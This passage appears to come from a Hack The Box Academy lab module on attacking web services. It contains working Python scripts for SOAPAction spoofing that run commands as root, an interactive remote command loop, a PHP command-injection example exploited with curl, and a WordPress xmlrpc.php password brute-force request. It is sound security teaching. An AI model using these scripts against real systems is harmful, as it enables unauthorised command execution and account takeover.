+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:ExecuteCommandRequest"</span>/&gt;</span>
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandSoapOut"</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:ExecuteCommandResponse"</span>/&gt;</span>
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+
+
+
+
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:portType</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheBoxSoapPort"</span>&gt;</span>
+
+
+    <span class="hljs-comment">&lt;!-- Login Operaion | PORT --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Login"</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:LoginSoapIn"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:LoginSoapOut"</span>/&gt;</span>
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+
+
+    <span class="hljs-comment">&lt;!-- ExecuteCommand Operation | PORT --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommand"</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:ExecuteCommandSoapIn"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:ExecuteCommandSoapOut"</span>/&gt;</span>
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:portType</span>&gt;</span>
+
+
+
+
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:binding</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxServiceSoapBinding"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"tns:HacktheBoxSoapPort"</span>&gt;</span>
+
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">soap:binding</span> <span class="hljs-attr">transport</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span>
+
+    <span class="hljs-comment">&lt;!-- SOAP Login Action --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Login"</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">"Login"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span>/&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+
+
+    <span class="hljs-comment">&lt;!-- SOAP ExecuteCommand Action --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommand"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">"ExecuteCommand"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span>/&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:binding</span>&gt;</span>
+
+
+
+
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxService"</span>&gt;</span>
+
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:port</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxServiceSoapPort"</span> <span class="hljs-attr">binding</span>=<span class="hljs-string">"tns:HacktheboxServiceSoapBinding"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">soap:address</span> <span class="hljs-attr">location</span>=<span class="hljs-string">"http://localhost:80/wsdl"</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:port</span>&gt;</span>
+
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:service</span>&gt;</span>
+
+
+
+
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:definitions</span>&gt;</span>
+</code></pre>
+<p>The first thing to pay attention to is the following.</p>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommand"</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">"ExecuteCommand"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span>/&gt;</span>
+</code></pre>
+<p>We can see a SOAPAction operation called <em>ExecuteCommand</em>.</p>
+<p>Let us take a look at the parameters.</p>
+<pre><code class="lang-xml">&lt;<span class="hljs-variable">s:element</span> name=<span class="hljs-string">"ExecuteCommandRequest"</span>&gt;
+&lt;<span class="hljs-variable">s:complexType</span>&gt;
+&lt;<span class="hljs-variable">s:sequence</span>&gt;
+&lt;<span class="hljs-variable">s:element</span> minOccurs=<span class="hljs-string">"1"</span> maxOccurs=<span class="hljs-string">"1"</span> name=<span class="hljs-string">"cmd"</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"s:string"</span>/&gt;
+&lt;/<span class="hljs-variable">s:sequence</span>&gt;
+&lt;/<span class="hljs-variable">s:complexType</span>&gt;
+&lt;/<span class="hljs-variable">s:element</span>&gt;
+</code></pre>
+<p>We notice that there is a <em>cmd</em> parameter. Let us build a Python script to issue requests (save it as <code>client.py</code>). Note that the below script will try to have the SOAP service execute a <code>whoami</code> command.</p>
+<pre><code class="lang-python"><span class="xml">import requests
+
+payload = '<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>  <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span> <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ExecuteCommandRequest</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">cmd</span>&gt;</span>whoami<span class="hljs-tag">&lt;/<span class="hljs-name">cmd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ExecuteCommandRequest</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>'
+
+print(requests.post("http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:3002/wsdl", data=payload, headers=</span><span class="hljs-template-variable">{"SOAPAction":'"ExecuteCommand"'}</span><span class="xml">).content)</span>
+</code></pre>
+<p>The Python script can be executed, as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 client.py
+b'<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span>  <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span> <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ExecuteCommandResponse</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">success</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">success</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">error</span>&gt;</span>This function is only allowed in internal networks<span class="hljs-tag">&lt;/<span class="hljs-name">error</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ExecuteCommandResponse</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>'
+</code></pre>
+<p>We get an error mentioning <em>This function is only allowed in internal networks</em>. We have no access to the internal networks. Does this mean we are stuck? Not yet! Let us try a SOAPAction spoofing attack, as follows.</p>
+<p>Let us build a new Python script for our SOAPAction spoofing attack (save it as <code>client_soapaction_spoofing.py</code>).</p>
+<pre><code class="lang-python"><span class="xml">import requests
+
+payload = '<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>  <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span> <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">LoginRequest</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">cmd</span>&gt;</span>whoami<span class="hljs-tag">&lt;/<span class="hljs-name">cmd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">LoginRequest</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>'
+
+print(requests.post("http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:3002/wsdl", data=payload, headers=</span><span class="hljs-template-variable">{"SOAPAction":'"ExecuteCommand"'}</span><span class="xml">).content)</span>
+</code></pre>
+<ul>
+<li>We specify <em>LoginRequest</em> in <code>&lt;soap:Body&gt;</code>, so that our request goes through. This operation is allowed from the outside.</li>
+<li>We specify the parameters of <em>ExecuteCommand</em> because we want to have the SOAP service execute a <code>whoami</code> command.</li>
+<li>We specify the blocked operation (<em>ExecuteCommand</em>) in the SOAPAction header</li>
+</ul>
+<p>If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass the restrictions and have the SOAP service execute a <code>whoami</code> command.</p>
+<p>Let us execute the new script.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 client_soapaction_spoofing.py
+b'<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span>  <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span> <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">LoginResponse</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">success</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">success</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>root\n<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">LoginResponse</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>'
+</code></pre>
+<p>Our <code>whoami</code> command was executed successfully, bypassing the restrictions through SOAPAction spoofing!</p>
+<p>If you want to be able to specify multiple commands and see the result each time, use the following Python script (save it as <code>automate.py</code>).</p>
+<pre><code class="lang-python"><span class="xml">import requests
+
+while True:
+    cmd = input("$ ")
+    payload = f'<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>  <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span> <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">LoginRequest</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">cmd</span>&gt;</span></span><span class="hljs-template-variable">{cmd}</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">cmd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">LoginRequest</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>'
+    print(requests.post("http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:3002/wsdl", data=payload, headers=</span><span class="hljs-template-variable">{"SOAPAction":'"ExecuteCommand"'}</span><span class="xml">).content)</span>
+</code></pre>
+<p>You can execute it as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 automate.py
+$ id
+b'<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span>  <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span> <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">LoginResponse</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">success</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">success</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>uid=0(root) gid=0(root) groups=0(root)\n<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">LoginResponse</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span>'
+$
+</code></pre>
+<h2 id="command-injection">Command Injection</h2>
+<hr>
+<p>Command injections are among the most critical vulnerabilities in web services. They allow system command execution directly on the back-end server. If a web service uses user-controlled input to execute a system command on the back-end server, an attacker may be able to inject a malicious payload to subvert the intended command and execute his own.</p>
+<p>Let us assess together a web service that is vulnerable to command injection.</p>
+<p>You may have come across connectivity-checking web services in router admin panels or even websites that merely execute a ping command towards a website of your choosing.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target service and follow along.</p>
+<p>Suppose we are assessing such a connectivity-checking service residing in <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/ping</code>. Suppose we have also been provided with the source code of the service.</p>
+<p><strong>Note</strong>: The web service we are about to assess does not follow the web service architectural designs/approaches we covered. It is quite close to a normal web service, though, as it provides its functionality in a programmatic way, and different clients can use it for connectivity-checking purposes.</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ping</span><span class="hljs-params">($host_url_ip, $packets)</span> </span>{
+        <span class="hljs-keyword">if</span> (!in_array($packets, <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>))) {
+                <span class="hljs-keyword">die</span>(<span class="hljs-string">'Only 1-4 packets!'</span>);
+        }
+        $cmd = <span class="hljs-string">"ping -c"</span> . $packets . <span class="hljs-string">" "</span> . escapeshellarg($host_url);
+        $delimiter = <span class="hljs-string">"\n"</span> . str_repeat(<span class="hljs-string">'-'</span>, <span class="hljs-number">50</span>) . <span class="hljs-string">"\n"</span>;
+        <span class="hljs-keyword">echo</span> $delimiter . implode($delimiter, <span class="hljs-keyword">array</span>(<span class="hljs-string">"Command:"</span>, $cmd, <span class="hljs-string">"Returned:"</span>, shell_exec($cmd)));
+}
+
+<span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>] === <span class="hljs-string">'GET'</span>) {
+        $prt = explode(<span class="hljs-string">'/'</span>, $_SERVER[<span class="hljs-string">'PATH_INFO'</span>]);
+        call_user_func_array($prt[<span class="hljs-number">1</span>], array_slice($prt, <span class="hljs-number">2</span>));
+}
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<ul>
+<li>A function called <em>ping</em> is defined, which takes two arguments _host_url_ip_ and <em>packets</em>. The request should look similar to the following. <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/ping/&lt;VPN/TUN Adapter IP&gt;/3</code>. To check that the web service is sending ping requests, execute the below in your attacking machine and then issue the request.<ul>
+<li><pre><code class="lang-shell-session">root@htb[/htb]$ sudo tcpdump -i tun0 icmp
+<span class="hljs-symbol"> tcpdump:</span> verbose output suppressed, use -v[v]... for full protocol decode
+ listening on tun0, link-type RAW (Raw <span class="hljs-built_in">IP</span>), snapshot length <span class="hljs-number">262144</span> bytes
+ <span class="hljs-number">11</span>:<span class="hljs-number">10</span>:<span class="hljs-number">22.521853</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.133</span> &gt; <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.222</span>: ICMP echo request, id <span class="hljs-number">1</span>, seq <span class="hljs-number">1</span>, length <span class="hljs-number">64</span>
+ <span class="hljs-number">11</span>:<span class="hljs-number">10</span>:<span class="hljs-number">22.521885</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.222</span> &gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.133</span>: ICMP echo reply, id <span class="hljs-number">1</span>, seq <span class="hljs-number">1</span>, length <span class="hljs-number">64</span>
+ <span class="hljs-number">11</span>:<span class="hljs-number">10</span>:<span class="hljs-number">23.522744</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.133</span> &gt; <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.222</span>: ICMP echo request, id <span class="hljs-number">1</span>, seq <span class="hljs-number">2</span>, length <span class="hljs-number">64</span>
+ <span class="hljs-number">11</span>:<span class="hljs-number">10</span>:<span class="hljs-number">23.522781</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.222</span> &gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.133</span>: ICMP echo reply, id <span class="hljs-number">1</span>, seq <span class="hljs-number">2</span>, length <span class="hljs-number">64</span>
+ <span class="hljs-number">11</span>:<span class="hljs-number">10</span>:<span class="hljs-number">24.523726</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.133</span> &gt; <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.222</span>: ICMP echo request, id <span class="hljs-number">1</span>, seq <span class="hljs-number">3</span>, length <span class="hljs-number">64</span>
+ <span class="hljs-number">11</span>:<span class="hljs-number">10</span>:<span class="hljs-number">24.523758</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.222</span> &gt; <span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.133</span>: ICMP echo reply, id <span class="hljs-number">1</span>, seq <span class="hljs-number">3</span>, length <span class="hljs-number">64</span>
+</code></pre>
+</li>
+</ul>
+</li>
+<li>The code also checks if the <em>packets</em>'s value is more than 4, and it does that via an array. So if we issue a request such as <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/ping/&lt;VPN/TUN Adapter IP&gt;/3333</code>, we're going to get an <em>Only 1-4 packets!</em> error.</li>
+<li>A variable called <em>cmd</em> is then created, which forms the ping command to be executed. Two values are "parsed", <em>packets</em> and _host_url_. <a href="https://www.php.net/manual/en/function.escapeshellarg.php">escapeshellarg()</a> is used to escape the _host_url_'s value. According to PHP's function reference, _escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() shell_exec() and the backtick operator._ If the _host_url_'s value was not escaped, the below could happen. <img src="storage\modules\160\1.png" alt="image"></li>
+<li>The command specified by the <em>cmd</em> parameter is executed with the help of the _shell_exec()_ PHP function.</li>
+<li>If the request method is GET, an existing function can be called with the help of <a href="https://www.php.net/manual/en/function.call-user-func-array.php">call_user_func_array()</a>. The _call_user_func_array()_ function is a special way to call an existing PHP function. It takes a function to call as its first parameter, then takes an array of parameters as its second parameter. This means that instead of <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/ping/www.example.com/3</code> an attacker could issue a request as follows. <code>http://&lt;TARGET IP&gt;:3003/ping-server.php/system/ls</code>. This constitutes a command injection vulnerability!</li>
+</ul>
+<p>You can test the command injection vulnerability as follows.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3003/</span>ping-server.php<span class="hljs-regexp">/system/</span>ls
+index.php
+ping-server.php
+</code></pre>
+<h2 id="attacking-wordpress-xmlrpc-php-">Attacking WordPress 'xmlrpc.php'</h2>
+<hr>
+<p>It is important to note that <code>xmlrpc.php</code> being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, <code>xmlrpc.php</code> can facilitate some enumeration and exploitation activities, though.</p>
+<p>Let us borrow an example from our <a href="https://academy.hackthebox.com/module/details/17">Hacking Wordpress</a> module.</p>
+<p>Suppose we are assessing the security of a WordPress instance residing in <em><a href="http://blog.inlanefreight.com">http://blog.inlanefreight.com</a></em>. Through enumeration activities, we identified a valid username, <code>admin</code>, and that <code>xmlrpc.php</code> is enabled. Identifying if <code>xmlrpc.php</code> is enabled is as easy as requesting <code>xmlrpc.php</code> on the domain we are assessing.</p>
+<p>We can mount a password brute-forcing attack through <code>xmlrpc.php</code>, as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST -d "<span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>CORRECT-PASSWORD<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span>" http://blog.inlanefreight.com/xmlrpc.php
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodResponse</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">struct</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>isAdmin<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
